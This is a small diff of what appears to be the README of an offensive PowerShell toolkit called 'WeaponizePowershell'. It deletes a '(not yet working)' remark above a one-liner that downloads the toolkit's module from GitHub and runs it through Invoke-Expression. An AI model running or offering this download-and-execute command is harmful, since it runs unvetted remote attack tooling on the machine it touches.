@@ -8,7 +8,6 @@
 # 5. Weapons (importable functions) mostly are importable independantly as powershell modules
 
 # -------------------------------------Execution------------------------------------------------
-  (not yet working)
   
 Powershell 3+ one liner execute:    
   Invoke-Expression (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
